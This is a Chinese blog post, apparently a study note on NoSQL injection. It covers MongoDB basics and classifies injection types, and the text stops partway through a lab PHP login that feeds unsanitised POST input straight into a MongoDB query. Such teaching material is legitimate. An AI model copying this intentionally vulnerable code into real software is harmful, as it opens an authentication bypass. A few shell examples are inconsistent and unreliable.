<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Nosql注入 | Blog of AyaN0</title><meta name="author" content="AyaN0"><meta name="copyright" content="AyaN0"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="N0sqlNo only SQL,目前最流行的nosql产品是MongoDB 一种数据结构由键值对组成的文档 和json类似 &#123;     &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),     &quot;name&quot; : &quot;whoami&quot;,     &quot;descrip">
<meta property="og:type" content="article">
<meta property="og:title" content="Nosql注入">
<meta property="og:url" content="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/">
<meta property="og:site_name" content="Blog of AyaN0">
<meta property="og:description" content="N0sqlNo only SQL,目前最流行的nosql产品是MongoDB 一种数据结构由键值对组成的文档 和json类似 &#123;     &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),     &quot;name&quot; : &quot;whoami&quot;,     &quot;descrip">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ayan0.top/img/ari.webp">
<meta property="article:published_time" content="2025-07-01T02:35:37.000Z">
<meta property="article:modified_time" content="2025-07-01T05:28:10.226Z">
<meta property="article:author" content="AyaN0">
<meta property="article:tag" content="-Web -SQL">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ayan0.top/img/ari.webp"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Nosql注入",
  "url": "https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/",
  "image": "https://ayan0.top/img/ari.webp",
  "datePublished": "2025-07-01T02:35:37.000Z",
  "dateModified": "2025-07-01T05:28:10.226Z",
  "author": [
    {
      "@type": "Person",
      "name": "AyaN0",
      "url": "https://ayan0.top/"
    }
  ]
}</script><link rel="shortcut icon" href="/img/logo.png"><link rel="canonical" href="https://ayan0.top/2025/07/01/Nosql%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!true && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: '复制成功',
    error: '复制失败',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Nosql注入',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="web_bg" style="background-image: url(/img/mea3.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/ari.webp" onerror="this.onerror=null;this.src='/img/dacapo.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/ari.webp" alt="Logo"><span class="site-name">Blog of AyaN0</span></a><a class="nav-page-title" href="/"><span class="site-name">Nosql注入</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 博文</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 归档</span></a></li></ul></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/shuoshuo/"><i class="fa-fw fa fa-comments-o"></i><span> 分享</span></a></li><li><a class="site-page child" href="/photos/"><i class="fa-fw fa fa-camera-retro"></i><span> 相册</span></a></li><li><a class="site-page child" href="/music/"><i class="fa-fw fa fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 影视</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于笔者</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Nosql注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-01T02:35:37.000Z" title="发表于 2025-07-01 10:35:37">2025-07-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-01T05:28:10.226Z" title="更新于 2025-07-01 13:28:10">2025-07-01</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="N0sql"><a href="#N0sql" class="headerlink" title="N0sql"></a>N0sql</h1><p>No only SQL,目前最流行的nosql产品是MongoDB</p>
<p>一种数据结构由键值对组成的文档</p>
<p>和json类似</p>
<pre><code class="highlight json"><span class="punctuation">&#123;</span>
    <span class="attr">&quot;_id&quot;</span> <span class="punctuation">:</span> ObjectId(<span class="string">&quot;60fa854cf8aaaf4f21049148&quot;</span>)<span class="punctuation">,</span>
    <span class="attr">&quot;name&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;whoami&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;description&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;the admin user&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;age&quot;</span> <span class="punctuation">:</span> <span class="number">19</span><span class="punctuation">,</span>
    <span class="attr">&quot;status&quot;</span> <span class="punctuation">:</span> <span class="string">&quot;A&quot;</span><span class="punctuation">,</span>
    <span class="attr">&quot;groups&quot;</span> <span class="punctuation">:</span> <span class="punctuation">[</span>
        <span class="string">&quot;admins&quot;</span><span class="punctuation">,</span>
        <span class="string">&quot;users&quot;</span>
    <span class="punctuation">]</span>
<span class="punctuation">&#125;</span></code></pre>

<h2 id="MongoDB-基础概念解析"><a href="#MongoDB-基础概念解析" class="headerlink" title="MongoDB 基础概念解析"></a>MongoDB 基础概念解析</h2><p>不管我们学习什么数据库都应该学习其中的基础概念，在 MongoDB 中基本的概念有文档、集合、数据库，如下表所示：</p>
<table>
<thead>
<tr>
<th>SQL 概念</th>
<th>MongoDB 概念</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>database</td>
<td>database</td>
<td>数据库</td>
</tr>
<tr>
<td>table</td>
<td>collection</td>
<td>数据库表&#x2F;集合</td>
</tr>
<tr>
<td>row</td>
<td>document</td>
<td>数据记录行&#x2F;文档</td>
</tr>
<tr>
<td>column</td>
<td>field</td>
<td>数据字段&#x2F;域</td>
</tr>
<tr>
<td>index</td>
<td>index</td>
<td>索引</td>
</tr>
<tr>
<td>table joins</td>
<td></td>
<td>表连接，MongoDB 不支持</td>
</tr>
<tr>
<td>primary key</td>
<td>primary key</td>
<td>主键，MongoDB 自动将 <code>_id</code> 字段设置为主键</td>
</tr>
</tbody></table>
<p>下表列出了关系型数据库 RDBMS 与 MongoDB 之间对应的术语：</p>
<table>
<thead>
<tr>
<th>RDBMS</th>
<th>MongoDB</th>
</tr>
</thead>
<tbody><tr>
<td>数据库</td>
<td>数据库</td>
</tr>
<tr>
<td>表格</td>
<td>集合</td>
</tr>
<tr>
<td>行</td>
<td>文档</td>
</tr>
<tr>
<td>列</td>
<td>字段</td>
</tr>
<tr>
<td>表联合</td>
<td>嵌入文档</td>
</tr>
<tr>
<td>主键</td>
<td>主键（MongoDB 提供了 key 为 _id）</td>
</tr>
</tbody></table>
<h3 id="数据库（Database）"><a href="#数据库（Database）" class="headerlink" title="数据库（Database）"></a>数据库（Database）</h3><p>个 MongoDB 中可以建立多个数据库。MongoDB 的单个实例可以容纳多个独立的数据库，每一个都有自己的集合和权限，不同的数据库也放置在不同的文件中。</p>
<p>使用 <code>show dbs</code> 命令可以显示所有数据库的列表：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; show dbs
admin   0.078GB
config  0.078GB
local   0.078GB
&gt;</code></pre>

<p>执行 <code>db</code> 命令可以显示当前数据库对象或集合：</p>
<pre><code class="highlight plaintext">$ ./mongo
MongoDB shell version: 3.0.6
connecting to: test
&gt; db
test
&gt;</code></pre>

<h3 id="文档（Document）"><a href="#文档（Document）" class="headerlink" title="文档（Document）"></a>文档（Document）</h3><p>文档是一组键值（key-value）对，类似于 RDBMS 关系型数据库中的一行。MongoDB 的文档不需要设置相同的字段，并且相同的字段不需要相同的数据类型，这与关系型数据库有很大的区别，也是 MongoDB 非常突出的特点。</p>
<p>一个简单的文档例子如下：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;, &quot;age&quot;:19&#125;</code></pre>

<h3 id="集合（Collection）"><a href="#集合（Collection）" class="headerlink" title="集合（Collection）"></a>集合（Collection）</h3><p>集合就是 MongoDB 文档组，类似于 RDBMS 关系数据库管理系统中的表格。集合存在于数据库中，集合没有固定的结构，这意味着你在对集合可以插入不同格式和类型的数据。</p>
<p>比如，我们可以将以下不同数据结构的文档插入到集合中：</p>
<pre><code class="highlight plaintext">&#123;&quot;name&quot;:&quot;whoami&quot;&#125;
&#123;&quot;name&quot;:&quot;bunny&quot;, &quot;age&quot;:19&#125;
&#123;&quot;name&quot;:&quot;bob&quot;, &quot;age&quot;:20, &quot;groups&quot;:[&quot;admins&quot;,&quot;users&quot;]&#125;</code></pre>

<p>当插入一个文档时，集合就会被自动创建。</p>
<p>如果我们要查看已有集合，可以使用 <code>show collections</code> 或 <code>show tables</code> 命令：</p>
<pre><code class="highlight plaintext">&gt; show collections
all_users
&gt; show tables
all_users
&gt;</code></pre>

<h2 id="MongoDB基础操作"><a href="#MongoDB基础操作" class="headerlink" title="MongoDB基础操作"></a>MongoDB基础操作</h2><h3 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h3><pre><code class="highlight plaintext">use DATABASENAME</code></pre>

<p>一键创建；若已存在就连接并切换到指定数据库</p>
<h3 id="创建集合"><a href="#创建集合" class="headerlink" title="创建集合"></a>创建集合</h3><pre><code class="highlight plaintext">db.createCollection(name,options)</code></pre>

<ul>
<li>name：要创建的集合名称</li>
<li>options：可选参数，指定有关内存大小及索引的选项</li>
</ul>
<p>如下实例，我们在 users 数据库中创建一个 all_users 集合：</p>
<pre><code class="highlight plaintext">&gt; use users
switched to db users
&gt; db.createCollection(&quot;all_users&quot;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;</code></pre>

<h3 id="插入文档"><a href="#插入文档" class="headerlink" title="插入文档"></a>插入文档</h3><pre><code class="highlight plaintext">db.COLLECTION_NAME.insert(document)</code></pre>

<p>如下实例，我们向存储在 users 数据库的 all_users 集合中插入一个文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.insert(&#123;name: &#x27;whoami&#x27;, 
    description: &#x27;the admin user&#x27;,
    age: 19,
    status: &#x27;A&#x27;,
    groups: [&#x27;admins&#x27;, &#x27;users&#x27;]
&#125;)</code></pre>

<p>我们也可以将文档数据定义为一个变量，然后再执行插入操作将变量插入。</p>
<h3 id="更新文档"><a href="#更新文档" class="headerlink" title="更新文档"></a>更新文档</h3><p>在 MongoDB 中我们可以使用 <code>update()</code> 或 <code>save()</code> 方法来更新集合中的文档。</p>
<ul>
<li><strong>update() 方法</strong></li>
</ul>
<p>update() 方法用于更新已存在的文档。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.update(
   &lt;query&gt;,
   &lt;update&gt;,
   &#123;
     upsert: &lt;boolean&gt;,
     multi: &lt;boolean&gt;,
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>参数说明：</p>
<ul>
<li>query：update 操作的查询条件，类似 sql update 语句中 where 子句后面的内容。</li>
<li>update：update 操作的对象和一些更新的操作符（如 <code>$set</code>）等，可以理解为 sql update 语句中 set 关键字后面的内容。</li>
<li>multi：可选，默认是 false，只更新找到的第一条记录，如果这个参数为 true，就把按条件查出来多条记录全部更新。</li>
</ul>
<p>接着我们通过 update() 方法来将年龄 age 从 19 更新到 20：</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:19&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;)
WriteResult(&#123; &quot;nMatched&quot; : 0, &quot;nUpserted&quot; : 0, &quot;nModified&quot; : 0 &#125;)
&gt;
&gt; db.all_users.find().pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<p>成功将 age 从 19 改为了 20。</p>
<p>以上语句只会修改第一条发现的文档，如果你要修改多条相同的文档，则需要设置 multi 参数为 true。</p>
<pre><code class="highlight plaintext">&gt; db.lover.update(&#123;&#x27;age&#x27;:&#x27;19&#x27;&#125;, &#123;$set:&#123;&#x27;age&#x27;:20&#125;&#125;, &#123;multi:true&#125;)</code></pre>

<ul>
<li><strong>save() 方法</strong></li>
</ul>
<p>save() 方法通过传入的文档来替换已有文档，<code>_id</code> 主键存在就更新，不存在就插入。语法格式如下：</p>
<pre><code class="highlight plaintext">db.collection.save(
   &lt;document&gt;,
   &#123;
     writeConcern: &lt;document&gt;
   &#125;
)</code></pre>

<p>参数说明：</p>
<ul>
<li>document：文档数据。</li>
</ul>
<p>如下实例中我们替换了 <code>_id</code> 为 60fa854cf8aaaf4f21049148 的文档数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.save(&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 21,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;)</code></pre>

<h3 id="查询文档"><a href="#查询文档" class="headerlink" title="查询文档"></a>查询文档</h3><pre><code class="highlight plaintext">db.collection.find(query,projection)</code></pre>

<p>参数说明：</p>
<ul>
<li>query：可选，使用查询操作符指定查询条件，相当于 sql select 语句中的 where 子句。</li>
<li>projection：可选，使用投影操作符指定返回的键。</li>
</ul>
<p>如下实例我们查询了集合 all_users 中的 age 为 20 的数据：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&quot;20&quot;&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : &quot;20&quot;, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>如果你需要以易读的方式来读取数据，可以使用 <code>pretty()</code> 方法以格式化的方式来显示所有文档：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:20&#125;).pretty()
&#123;
    &quot;_id&quot; : ObjectId(&quot;60fa854cf8aaaf4f21049148&quot;),
    &quot;name&quot; : &quot;whoami&quot;,
    &quot;description&quot; : &quot;the admin user&quot;,
    &quot;age&quot; : 20,
    &quot;status&quot; : &quot;A&quot;,
    &quot;groups&quot; : [
        &quot;admins&quot;,
        &quot;users&quot;
    ]
&#125;
&gt;</code></pre>

<h4 id="MongoDB-与-RDBMS-之间的类比比较"><a href="#MongoDB-与-RDBMS-之间的类比比较" class="headerlink" title="MongoDB 与 RDBMS 之间的类比比较"></a>MongoDB 与 RDBMS 之间的类比比较</h4><p>如果你熟悉常规的 SQL 数据，通过下表可以更好的理解 MongoDB 的条件语句查询：</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>格式</th>
<th>范例</th>
<th>RDBMS 中的类似语句</th>
</tr>
</thead>
<tbody><tr>
<td>等于</td>
<td><code>&#123;&lt;key&gt;:&lt;value&gt;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;name&quot;:&quot;whoami&quot;&#125;).pretty()</code></td>
<td><code>where name = &#39;whoami&#39;</code></td>
</tr>
<tr>
<td>小于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lt:19&#125;&#125;).pretty()</code></td>
<td><code>where age &lt; 19</code></td>
</tr>
<tr>
<td>小于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$lte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$lte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &lt;= 19</code></td>
</tr>
<tr>
<td>大于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gt:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt; 19</code></td>
</tr>
<tr>
<td>大于或等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$gte:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$gte:19&#125;&#125;).pretty()</code></td>
<td><code>where likes &gt;= 19</code></td>
</tr>
<tr>
<td>不等于</td>
<td><code>&#123;&lt;key&gt;:&#123;$ne:&lt;value&gt;&#125;&#125;</code></td>
<td><code>db.love.find(&#123;&quot;age&quot;:&#123;$ne:19&#125;&#125;).pretty()</code></td>
<td><code>where likes != 19</code></td>
</tr>
</tbody></table>
<p>而查询时的<strong>AND语句</strong>的表示即用<code>,</code>隔开多个键值对</p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;status&quot;:&quot;B&quot;, &quot;age&quot;:20&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ef8f8aaaf4f2104914e&quot;), &quot;name&quot; : &quot;bob&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;B&quot;, &quot;groups&quot; : [ &quot;normals&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<p>以上实例中类似于 RDBMS 中的 WHERE 语句：<code>WHERE status=&#39;B&#39; AND age=20</code></p>
<p>查询时的<strong>OR语句</strong>要在开头加上<code>$or</code></p>
<p>语法格式如下：</p>
<pre><code class="highlight plaintext">&gt; db.col.find(
   &#123;
      $or: [
         &#123;key1: value1&#125;, &#123;key2:value2&#125;
      ]
   &#125;
).pretty()</code></pre>

<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p>如下实例，我们查询键 <code>status</code> 值为 A 或键 <code>age</code> 值为 19 的文档。</p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;$or:[&#123;&quot;status&quot;:&quot;A&quot;, &quot;age&quot;:&quot;19&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa8ec6f8aaaf4f2104914c&quot;), &quot;name&quot; : &quot;bunny&quot;, &quot;description&quot; : &quot;the normal user&quot;, &quot;age&quot; : 19, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;lovers&quot;, &quot;users&quot; ] &#125;</code></pre>

<p><strong>联合使用</strong></p>
<p>以下实例演示了 AND 和 OR 联合使用，类似于 RDBMS 中的 WHERE 语句： <code>where age&gt;19 AND (name=&#39;whoami&#39; OR status=&#39;A&#39;)</code></p>
<pre><code class="highlight plaintext">&gt; db.all_users.find(&#123;&quot;age&quot;:&#123;$gt:19&#125;, $or: [&#123;&quot;name&quot;:&quot;whoami&quot;&#125;, &#123;&quot;status&quot;:&quot;A&quot;&#125;]&#125;)
&#123; &quot;_id&quot; : ObjectId(&quot;60fa9176f8aaaf4f21049150&quot;), &quot;name&quot; : &quot;whoami&quot;, &quot;description&quot; : &quot;the admin user&quot;, &quot;age&quot; : 20, &quot;status&quot; : &quot;A&quot;, &quot;groups&quot; : [ &quot;admins&quot;, &quot;users&quot; ] &#125;
&gt;</code></pre>

<h2 id="注入时间到"><a href="#注入时间到" class="headerlink" title="注入时间到"></a>注入时间到</h2><p>按照语言分类</p>
<p>可以分为</p>
<ul>
<li>PHP数组注入</li>
<li>js注入</li>
<li>mongoshell拼接注入</li>
</ul>
<p>按照攻击机制分类</p>
<p>可以分为</p>
<ul>
<li>重言式注入</li>
<li>联合查询注入</li>
<li>js注入</li>
<li>盲注</li>
</ul>
<hr>
<ul>
<li><strong>重言式注入</strong></li>
</ul>
<p>又称为永真式，此类攻击是在条件语句中注入代码，使生成的表达式判定结果永远为真，从而绕过认证或访问机制。</p>
<ul>
<li><strong>联合查询注入</strong></li>
</ul>
<p>联合查询是一种众所周知的 SQL 注入技术，攻击者利用一个脆弱的参数去改变给定查询返回的数据集。联合查询最常用的用法是绕过认证页面获取数据。</p>
<ul>
<li><strong>JavaScript 注入</strong></li>
</ul>
<p>MongoDB Server 支持 JavaScript，这使得在数据引擎进行复杂事务和查询成为可能，但是传递不干净的用户输入到这些查询中可以注入任意的 JavaScript 代码，导致非法的数据获取或篡改。</p>
<ul>
<li><strong>盲注</strong></li>
</ul>
<p>当页面没有回显时，那么我们可以通过 <code>$regex</code> 正则表达式来达到和传统 SQL 注入中 <code>substr()</code> 函数相同的功能，而且 NoSQL 用到的基本上都是布尔盲注。</p>
<h3 id="PHP中的注入"><a href="#PHP中的注入" class="headerlink" title="PHP中的注入"></a>PHP中的注入</h3><h4 id="重言式注入"><a href="#重言式注入" class="headerlink" title="重言式注入"></a>重言式注入</h4><p>保证一个永真条件即可</p>
<p>首先在 MongoDB 中选中 test 数据库，创建一个 users 集合并插入文档数据：</p>
<pre><code class="highlight plaintext">&gt; use test
switched to db test
&gt;
&gt; db.createCollection(&#x27;users&#x27;)
&#123; &quot;ok&quot; : 1 &#125;
&gt;
&gt; db.users.insert(&#123;username: &#x27;admin&#x27;, password: &#x27;123456&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;whoami&#x27;, password: &#x27;657260&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bunny&#x27;, password: &#x27;964795&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt; db.users.insert(&#123;username: &#x27;bob&#x27;, password: &#x27;965379&#x27;&#125;)
WriteResult(&#123; &quot;nInserted&quot; : 1 &#125;)
&gt;</code></pre>

<p>然后编写 index.php：</p>
<pre><code class="highlight plaintext">&lt;?php
$manager = new MongoDB\Driver\Manager(&quot;mongodb://127.0.0.1:27017&quot;);
$username = $_POST[&#x27;username&#x27;];
$password = $_POST[&#x27;password&#x27;];

$query = new MongoDB\Driver\Query(array(
    &#x27;username&#x27; =&gt; $username,
    &#x27;password&#x27; =&gt; $password
));

$result = $manager-&gt;executeQuery(&#x27;test.users&#x27;, $query)-&gt;toArray();
$count = count($result);
if ($count &gt; 0) &#123;
